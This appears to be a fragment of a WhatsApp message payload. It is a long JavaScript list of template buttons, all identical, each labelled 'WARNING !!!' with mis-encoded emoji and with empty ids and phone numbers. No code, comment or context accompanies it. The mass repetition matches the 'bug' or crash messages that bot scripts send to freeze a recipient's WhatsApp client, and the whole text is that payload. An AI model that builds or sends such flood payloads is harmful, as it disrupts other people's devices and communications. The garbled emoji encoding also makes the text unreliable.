{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
  { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
  { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
  { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
